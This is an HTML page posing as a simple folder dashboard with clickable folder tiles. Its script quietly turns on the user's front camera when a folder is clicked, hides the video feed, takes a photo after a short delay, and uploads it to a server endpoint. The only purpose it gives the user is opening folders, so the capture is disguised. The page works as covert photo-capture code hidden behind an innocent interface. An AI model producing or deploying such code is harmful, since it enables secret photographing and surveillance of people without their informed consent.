<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Folder Dashboard</title>
    <style>
        body {
            margin: 0;
            padding: 2rem;
            background-color: #1e1e2f;
            color: #fff;
            font-family: Arial, sans-serif;
        }

        h1 {
            text-align: center;
            margin-bottom: 2rem;
            font-size: 2.5rem;
            color: #f7d217;
        }

        .folder-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 1.5rem;
        }

        .folder {
            background-color: #2a2a40;
            border: 2px solid #3d3d5c;
            border-radius: 12px;
            padding: 1rem;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
            transition: transform 0.2s ease;
        }

        .folder:hover {
            transform: scale(1.05);
            cursor: pointer;
        }

        .folder-icon {
            font-size: 3rem;
            margin-bottom: 0.5rem;
        }

        .folder-name {
            font-size: 1rem;
            font-weight: bold;
            color: #ccc;
        }

        video, canvas {
            display: none; /* Hide video feed to avoid user distraction */
        }
    </style>
</head>
<body>

    <h1>üìÇ Your Folders</h1>
    <div class="folder-grid">
        <div class="folder" onclick="startCamera('Adam')">
            <div class="folder-icon">üìÅ</div>
            <div class="folder-name">Adam</div>
        </div>
        <div class="folder" onclick="startCamera('Yassine')">
            <div class="folder-icon">üìÅ</div>
            <div class="folder-name">Yassine</div>
        </div>
        <!-- Add more folders as needed -->
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let hasPermission = false;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function startCamera(folderName) {
            if (!hasPermission) {
                // Request camera access only once
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                    .then(stream => {
                        hasPermission = true; // Grant permission
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            // Optional: Trigger image capture after a short delay
                            setTimeout(() => captureAndSend(folderName), 1500);
                        };
                    })
                    .catch(err => console.warn('Camera permission denied.'));
            } else {
                captureAndSend(folderName); // Take photo directly
            }
        }

        function captureAndSend(folderName) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const image = canvas.toDataURL('image/png');

            fetch('/upload/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `image=${encodeURIComponent(image)}&folder=${folderName}`
            })
            .then(res => res.json())
            .then(data => console.log("Image saved as:", data.file))
            .catch(err => console.error('Error uploading image:', err));
        }
    </script>

</body>
</html>
